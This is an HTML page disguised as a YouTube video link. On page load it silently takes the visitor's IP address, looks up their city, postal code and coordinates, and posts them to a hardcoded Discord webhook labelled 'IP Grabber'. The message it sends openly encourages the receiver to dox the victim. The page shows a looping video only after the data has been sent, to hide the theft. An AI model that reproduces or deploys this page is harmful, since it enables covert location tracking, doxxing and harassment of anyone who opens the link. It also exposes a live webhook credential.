<!DOCTYPE html>
<html>
<head>
    <title>mm</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }

        #video-container {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        #player {
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>

<p id="loading-message">pls wait while this loads</p>

<div id="video-container">
    <div id="player"></div>
</div>

<script>
    async function getIP(json) {
        const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';

        try {
            const locationInfo = await getLocation(json.ip);

            const data = {
                "content": null,
                "embeds": [
                    {
                        "title": "From IP Grabber:",
                        "description": "The most recent logged-in user's location information are:\n",
                        "color": 15431437,
                        "fields": [
                            {
                            "name": "IP:",
                            "value": json.ip
                            },
                            {
                                "name": "City:",
                                "value": locationInfo.city
                            },
                            {
                                "name": "Region:",
                                "value": locationInfo.region
                            },
                            {
                                "name": "Country:",
                                "value": locationInfo.country
                            },
                            {
                                "name": "Timezone:",
                                "value": locationInfo.timezone
                            },
                            {
                                "name": "Latitude:",
                                "value": locationInfo.loc.split(",")[0]
                            },
                            {
                                "name": "Longitude:",
                                "value": locationInfo.loc.split(",")[1]
                            },
                            {
                            "name": "Network:",
                            "value": locationInfo.org
                            },
                            {
                            "name": "Location:",
                            "value": locationInfo.loc
                            },
                            {
                            "name": "Postal Code:",
                            "value": locationInfo.postal
                            },
                            {
                                "name": "Now feel free to dox the living shit of that guy.",
                                "value": "(or use it when you're about to lose an argument against him)"
                            }
                        ],
                        "footer": {
                            "text": `From ${window.location.href}`
                        }
                    }
                ],
                "attachments": []
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            document.getElementById("loading-message").style.display = "none";
            document.getElementById("video-container").style.display = "block";

            loadYouTubePlayerAPI();

        } catch(error) {
            document.getElementById("loading-message").textContent = "Failed to send IP information";
            console.error(error);
        }
    }

    async function getLocation(ipAddress) {
        const url = `https://ipinfo.io/${ipAddress}/json`;
        try {
            const response = await fetch(url);
            const data = await response.json();
            return data;
        } catch (error) {
            return null;
        }
    }

    function loadYouTubePlayerAPI() {
        const tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        const firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
    }

    let player;
    function onYouTubeIframeAPIReady() {
        player = new YT.Player('player', {
            height: '100%',
            width: '100%',
            videoId: 'Ba12wkFtIUc',
            playerVars: {
                'autoplay': 1,
                'mute': 1,
                'controls': 0,
                'loop': 1
            },
            events: {
                'onReady': onPlayerReady
            }
        });
    }

    function onPlayerReady(event) {
        event.target.playVideo();
    }
</script>
<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
</body>
</html>
